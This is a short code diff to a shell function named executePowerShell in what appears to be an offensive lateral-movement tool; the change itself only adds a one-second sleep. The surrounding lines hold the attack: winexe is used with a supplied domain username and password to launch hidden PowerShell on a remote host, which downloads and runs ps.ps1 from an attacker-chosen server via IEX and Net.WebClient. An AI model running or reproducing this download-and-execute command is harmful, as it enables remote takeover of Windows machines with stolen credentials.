@@ -418,7 +418,8 @@ function executePowerShell
     USERNAME=$2
     PASSWORD=$3
     DOMAIN=$4
-    SERVERCEC=$5 
+    SERVERCEC=$5
+    sleep 1
     ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC/ps.ps1')"
     winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
 }
